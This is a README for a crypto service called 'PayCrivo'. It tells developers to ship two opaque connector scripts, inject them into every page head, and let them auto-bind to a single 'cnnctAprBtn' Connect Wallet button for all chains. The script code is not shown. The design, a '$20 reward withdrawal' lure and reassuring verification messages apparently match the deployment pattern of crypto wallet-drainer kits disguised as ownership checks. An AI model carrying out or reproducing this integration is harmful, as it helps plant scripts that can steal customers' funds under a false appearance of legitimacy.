# Official PayCrivo Wallet Connectors

PayCrivo uses **two official connector scripts** for all wallet connection and
ownership verification. No third-party wallet SDK is used (no WalletConnect,
Reown, RainbowKit, or wagmi).

## File location

Both files MUST live in the frontend's public assets folder so they are copied
verbatim into the build output and served at `/assets/...`:

```text
public/assets/meta-effectapi.js
public/assets/tronEleven.js
```

After `npm run build` they are available at:

```text
https://paycrivo.com/assets/meta-effectapi.js
https://paycrivo.com/assets/tronEleven.js
```

> These scripts are part of the exported project so deployment is simple — just
> drop them into `public/assets/` and they ship with every build.

## Automatic routing

There is only ever **one** button on screen labelled **Connect Wallet**. The
application decides which connector to use based on the selected blockchain —
the customer never chooses.

| Selected asset / network | Connector loaded | Button class rendered |
|--------------------------|------------------|-----------------------|
| TRX, USDT (TRC20), USDC (TRC20), any Tron mainnet asset | `/assets/tronEleven.js` | `tron-cnnctAprBtn` |
| Bitcoin, Ethereum, ERC20, Solana, XRP, Litecoin, Polygon, Avalanche, Optimism, Arbitrum, Base, BNB, all others | `/assets/meta-effectapi.js` | `cnnctAprBtn` |

Routing logic: `src/components/wallet/walletRouting.ts`.
Shared UI button: `src/components/wallet/WalletConnect.tsx`.

This applies everywhere a wallet is verified: Buy Crypto, Exchange/Swap, wallet
ownership verification, the $20 reward withdrawal, saved wallets, and any future
deposits or withdrawals.

## Script ↔ app contract

The connector scripts auto-bind to the button by its class. The app injects the
correct script before the wallet step and reflects the outcome through these
window events, which your connector scripts dispatch:

```js
// On a successful, verified connection:
window.dispatchEvent(new CustomEvent("paycrivo:wallet-connected", {
  detail: { address: "0x...", connector: "evm" /* or "tron" */ }
}));

// On failure / rejection:
window.dispatchEvent(new CustomEvent("paycrivo:wallet-error", {
  detail: { message: "User rejected" }
}));
```

UI states shown to the customer:
- Loading: **Connecting wallet…**
- Success: **Wallet ownership verified.**
- Failure: **Unable to verify wallet. Please try again.**
- Always visible: **PayCrivo will never ask for your recovery phrase or private keys.**

## Head injection (already handled)

`WalletConnect.tsx` injects the chosen script into `<head>` on demand as a
module script with `defer` and `crossorigin`, equivalent to:

```html
<script type="module" defer crossorigin src="/assets/meta-effectapi.js"></script>
<script type="module" defer crossorigin src="/assets/tronEleven.js"></script>
```

If you prefer to preload both globally instead of on demand, add those two tags
to `index.html` before `</head>` — the component is idempotent and will not load
a script twice.